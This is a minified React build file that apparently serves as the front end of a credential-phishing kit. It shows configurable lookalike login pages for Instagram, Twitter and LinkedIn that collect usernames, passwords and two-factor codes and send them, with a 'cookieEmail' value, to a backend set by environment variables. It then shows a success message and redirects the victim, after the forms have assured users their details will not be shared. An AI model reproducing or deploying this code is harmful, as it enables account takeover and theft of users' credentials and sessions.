(this["webpackJsonpinsta-linkedin-frontend"]=this["webpackJsonpinsta-linkedin-frontend"]||[]).push([[0],{41:function(e,t,a){e.exports=a(64)},64:function(e,t,a){"use strict";a.r(t);var n=a(0),r=a.n(n),o=a(17),s=a.n(o),l=a(15),c=a(11),i=a(12),u=a(14),m=a(13),d=a(72),E=a(66),h=a(35),g=a(67),A=a(68),f=a(10),_=a.n(f),p=_()(),C=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),s=0;s<n;s++)o[s]=arguments[s];return(e=t.call.apply(t,[this].concat(o))).state={redirect:!1,to:""},e.setRedirect=function(t){e.setState({redirect:!0,to:t})},e.renderRedirect=function(){if(console.log(e.state.redirect),e.state.redirect)return r.a.createElement(l.a,{to:e.state.to})},e}return Object(i.a)(a,[{key:"componentDidMount",value:function(){var e=document.getElementById("FavIcon");void 0===p.REACT_APP_FAVICONURL&&""===p.REACT_APP_FAVICONURL||(e.href="".concat(p.REACT_APP_FAVICONURL));var t=document.getElementById("AppTitle");void 0!==p.REACT_APP_TITLE||""!==p.REACT_APP_TITLE?t.innerText="".concat(p.REACT_APP_TITLE):t.innerText="App"}},{key:"render",value:function(){var e=this;return r.a.createElement("div",null,this.renderRedirect(),r.a.createElement(d.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"},className:"text-center"},r.a.createElement(d.a.Header,null,"Select a login option"),r.a.createElement(d.a.Body,null,r.a.createElement(E.a,{fluid:!0},r.a.createElement(h.a,null,"true"===p.REACT_APP_INSTAGRAM?r.a.createElement(g.a,null,r.a.createElement(A.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-danger",onClick:function(){return e.setRedirect("/Instagram")}},"INSTAGRAM")):"","true"===p.REACT_APP_TWITTER?r.a.createElement(g.a,null,r.a.createElement(A.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-primary",onClick:function(){return e.setRedirect("/Twitter")}},"TWITTER")):"","true"===p.REACT_APP_LINKEDIN?r.a.createElement(g.a,null,r.a.createElement(A.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-info",onClick:function(){return e.setRedirect("/LinkedIn")}},"LINKEDIN")):"")))),r.a.createElement(d.a,{title:"Select login options"}))}}]),a}(n.Component),T=a(71),w=a(70),P=a(69),R=a(22),v=_()(),S=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),s=0;s<n;s++)o[s]=arguments[s];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",twoFactor:!1,email_auth:!1,success:!1,code:"",two_factor_identifier:"",verificationMethod:""},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,r=a.maxLength,o=n.slice(0,r);e.setState({code:o})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(v.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:R.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor?e.setState({email_auth:t.email_auth,twoFactor:!0,loading:!0,two_factor_identifier:t.two_factor_identifier,verificationMethod:t.verificationMethod}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):e.state.email_auth?fetch("".concat(v.REACT_APP_URL,"/insta/emailVerify?username=").concat(e.state.username,"&code=").concat(e.state.code),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?fetch("".concat(v.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:R.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor||e.setState({success:!0}):e.setState({loading:!1})})):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))})):fetch("".concat(v.REACT_APP_URL,"/insta/submitCode?username=").concat(e.state.username,"&password=").concat(e.state.password,"&code=").concat(e.state.code,"&two_factor_identifier=").concat(e.state.two_factor_identifier,"&verificationMethod=").concat(e.state.verificationMethod,"&cookieEmail=").concat(v.REACT_APP_COOKIE_EMAIL),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),t.success?e.setState({success:!0,message:t.message},(function(){e.onShowAlert()})):e.setState({message:t.message},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return r.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return r.a.createElement("div",null,this.renderRedirect(),r.a.createElement(A.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?r.a.createElement(T.a,{variant:"danger"},this.state.message):"",r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement("center",null,"true"===v.REACT_APP_BANNER_INSTAGRAM?r.a.createElement("div",null,r.a.createElement(d.a,{bg:"success",text:"light"},r.a.createElement(d.a.Header,null,v.REACT_APP_BANNER_INSTAGRAM_HEADER),r.a.createElement(d.a.Body,null,r.a.createElement(d.a.Text,null,v.REACT_APP_BANNER_INSTAGRAM_BODY)))," "):"",r.a.createElement("h1",null,r.a.createElement("img",{alt:"logo",src:v.REACT_APP_FAVICONURL,height:"48px",width:"48px",style:{objectFit:"cover",borderRadius:"50%"}}),void 0!==v.REACT_APP_TITLE&&""!==v.REACT_APP_TITLE?v.REACT_APP_TITLE:"Instagram Login")),this.state.success?r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement(l.b,{component:function(){return window.location.href=v.REACT_APP_REDIRECTURL,null}}),r.a.createElement("center",null,r.a.createElement("h1",null,"Login Sucess Thank You!"))):r.a.createElement(g.a,null,r.a.createElement(h.a,null,r.a.createElement(w.a,{onSubmit:function(t){return e.handleClick(t)}},r.a.createElement(w.a.Group,{controlId:"formBasicEmail"},r.a.createElement(w.a.Label,null,"Username"),r.a.createElement(w.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)},type:"username",placeholder:"Enter Instagram username"}),r.a.createElement(w.a.Text,{className:"text-muted"},"We'll never share your details with anyone else.")),r.a.createElement(w.a.Group,{controlId:"formBasicPassword"},r.a.createElement(w.a.Label,null,"Password"),r.a.createElement(w.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",placeholder:"Enter Instagram Password"})),this.state.loading?r.a.createElement(A.a,{variant:"primary",type:"submit",disabled:!0},r.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):r.a.createElement(A.a,{variant:"primary",type:"submit"},"Login"),this.state.twoFactor?r.a.createElement("div",null,r.a.createElement(w.a.Group,null,this.state.email_auth?r.a.createElement(w.a.Label,null,"Please enter the code received"):r.a.createElement(w.a.Label,null,"Enter code recieved"),r.a.createElement(w.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),r.a.createElement(A.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),b=a(22),y=_()(),I=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),s=0;s<n;s++)o[s]=arguments[s];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:""},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,r=a.maxLength,o=n.slice(0,r);e.setState({code:o})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(y.REACT_APP_URL,"/linkedin"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:b.stringify({username:e.state.username,password:e.state.password,cookieEmail:y.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(y.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(y.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return r.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return r.a.createElement("div",null,this.renderRedirect(),r.a.createElement(A.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?r.a.createElement(T.a,{variant:"dark"},this.state.message):"",r.a.createElement("br",null),r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement("center",null,"true"===y.REACT_APP_BANNER_LINKEDIN?r.a.createElement("div",null,r.a.createElement(d.a,{bg:"success",text:"light"},r.a.createElement(d.a.Header,null,y.REACT_APP_BANNER_LINKEDIN_HEADER),r.a.createElement(d.a.Body,null,r.a.createElement(d.a.Text,null,y.REACT_APP_BANNER_LINKEDIN_BODY)))," "):"",r.a.createElement("br",null),r.a.createElement("h1",null,r.a.createElement("img",{alt:"logo",src:y.REACT_APP_FAVICONURL,height:"48px",width:"48px",style:{objectFit:"cover",borderRadius:"50%"}}),void 0!==y.REACT_APP_TITLE&&""!==y.REACT_APP_TITLE?y.REACT_APP_TITLE:" LinkedIn login")),this.state.success?r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement("center",null,r.a.createElement("h1",null,"Login Success Thank You!")),r.a.createElement(l.b,{component:function(){return window.location.href=y.REACT_APP_REDIRECTURL,null}})):r.a.createElement(g.a,null,r.a.createElement(h.a,null,r.a.createElement(w.a,{onSubmit:function(t){return e.handleClick(t)}},r.a.createElement(w.a.Group,{controlId:"formBasicEmail"},r.a.createElement(w.a.Label,null,"Enter Linkedin Username/MobileNumber"),r.a.createElement(w.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),r.a.createElement(w.a.Group,{controlId:"formBasicPassword"},r.a.createElement(w.a.Label,null,"Enter Linkedin Password"),r.a.createElement(w.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?r.a.createElement(A.a,{variant:"primary",type:"submit",disabled:!0},r.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):r.a.createElement(A.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?r.a.createElement("div",null,r.a.createElement(w.a.Group,null,r.a.createElement(w.a.Label,null,"Enter code recieved in your email"),r.a.createElement(w.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),r.a.createElement(A.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),L=a(22),k=_()(),N=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),s=0;s<n;s++)o[s]=arguments[s];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challenge_id:"",challenge_type:"",enc_user_id:"",code:""},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){e.setState({code:t.target.value})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(k.REACT_APP_URL,"/login/twitter"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:L.stringify({username:e.state.username,password:e.state.password,cookieEmail:k.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challenge_type:t.challenge_type,challenge_id:t.challenge_id,enc_user_id:t.enc_user_id,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){fetch("".concat(k.REACT_APP_URL,"/login/twitter/verifyCode?code=").concat(e.state.code,"&challenge_type=").concat(e.state.challenge_type,"&enc_user_id=").concat(e.state.enc_user_id,"&cookieEmail=").concat(k.REACT_APP_COOKIE_EMAIL,"&username=").concat(e.state.username,"&password=").concat(e.state.password,"&challenge_id=").concat(e.state.challenge_id),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return r.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return r.a.createElement("div",null,this.renderRedirect(),r.a.createElement(A.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?r.a.createElement(T.a,{variant:"dark"},this.state.message):"",r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement("center",null,"true"===k.REACT_APP_BANNER_TWITTER?r.a.createElement("div",null,r.a.createElement(d.a,{bg:"success",text:"light"},r.a.createElement(d.a.Header,null,k.REACT_APP_BANNER_TWITTER_HEADER),r.a.createElement(d.a.Body,null,r.a.createElement(d.a.Text,null,k.REACT_APP_BANNER_TWITTER_BODY)))," "):""),r.a.createElement("center",null,r.a.createElement("h1",null,r.a.createElement("img",{alt:"logo",src:k.REACT_APP_FAVICONURL,height:"48px",width:"48px",style:{objectFit:"cover",borderRadius:"50%"}}),void 0!==k.REACT_APP_TITLE&&""!==k.REACT_APP_TITLE?k.REACT_APP_TITLE:"Twitter login")),this.state.success?r.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},r.a.createElement("center",null,r.a.createElement("h1",null,"Login Success Thank You!")),r.a.createElement(l.b,{component:function(){return window.location.href=k.REACT_APP_REDIRECTURL,null}})):r.a.createElement(g.a,null,r.a.createElement(h.a,null,r.a.createElement(w.a,{onSubmit:function(t){return e.handleClick(t)}},r.a.createElement(w.a.Group,{controlId:"formBasicEmail"},r.a.createElement(w.a.Label,null,"Enter Twitter Username"),r.a.createElement(w.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),r.a.createElement(w.a.Group,{controlId:"formBasicPassword"},r.a.createElement(w.a.Label,null,"Enter Twitter Password"),r.a.createElement(w.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?r.a.createElement(A.a,{variant:"primary",type:"submit",disabled:!0},r.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):r.a.createElement(A.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?r.a.createElement("div",null,r.a.createElement(w.a.Group,null,r.a.createElement(w.a.Label,null,"RetypeEmail"===this.state.challenge_type?"Enter your email id":"Enter code recieved in your email"),r.a.createElement(w.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"text"})),r.a.createElement(A.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),O=_()();console.log("env is"+O.REACT_APP_SELECT);var x=function(){return r.a.createElement(l.d,null,r.a.createElement(l.b,{path:"/",component:C,exact:!0}),"true"===O.REACT_APP_TWITTER?r.a.createElement(l.b,{path:"/Twitter",component:N,exact:!0}):"","true"===O.REACT_APP_LINKEDIN?r.a.createElement(l.b,{path:"/LinkedIn",component:I,exact:!0}):"","true"===O.REACT_APP_INSTAGRAM?r.a.createElement(l.b,{path:"/Instagram",component:S,exact:!0}):"")},U=a(16),j=a(6),B=Object(j.a)();s.a.render(r.a.createElement(U.a,{history:B},r.a.createElement(x,null)),document.getElementById("root"))}},[[41,1,2]]]);
//# sourceMappingURL=main.db845fd7.chunk.js.map